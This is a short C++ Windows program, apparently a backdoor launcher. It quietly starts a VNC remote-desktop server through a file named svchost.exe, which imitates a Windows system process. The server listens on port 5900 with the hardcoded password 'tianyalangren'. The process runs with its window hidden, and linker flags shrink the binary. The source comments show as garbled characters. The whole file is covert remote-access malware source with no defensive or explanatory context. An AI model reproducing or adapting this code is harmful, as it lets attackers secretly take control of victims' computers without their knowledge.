// 1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<windows.h>
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"kernel32.lib") 

#pragma comment(linker, "/OPT:NOWIN98")   //ȡ����4�е�ע�ͣ��ɱ����2K����ļ� 
#pragma comment(linker, "/merge:.data=.text")    
#pragma comment(linker, "/merge:.rdata=.text")    
#pragma comment(linker, "/align:0x200") 
#pragma comment(linker, "/ENTRY:run")    
#pragma comment(linker, "/subsystem:windows") 

void run()
{
	char WindowsPath[MAX_PATH]={0};
    GetWindowsDirectory(WindowsPath,MAX_PATH);
	
    char pas[32]="\\svchost.exe vnc.dll,VNC -port ";
    strcat(WindowsPath,pas);
    char port[6]="5900";
    strcat(WindowsPath,port);
	
    char password[20]="tianyalangren";
	//char pas[1024]=" vnc.dll,VNC -port 5900 -password 123";
    strcat(WindowsPath," -password ");
	
    strcat(WindowsPath,password);
	
	
	
	STARTUPINFO si; //��������ʱ��Ҫ��ʼ���Ľṹ
	PROCESS_INFORMATION pi; //������������й���Ϣ
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.wShowWindow = SW_HIDE;//�������ô���Ϊ��ʾ��SW_HIDEΪ���ش���
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//CreateProcess(NULL,
	//cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi);
	
	if(!CreateProcess(NULL,WindowsPath,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi))
	{
		//MessageBox(0,WindowsPath,"����", MB_OK);
		//printf("���г���!\r\n");
	}
	//return 0;   
	//MessageBox(0,pas,cmd, MB_OK);
}
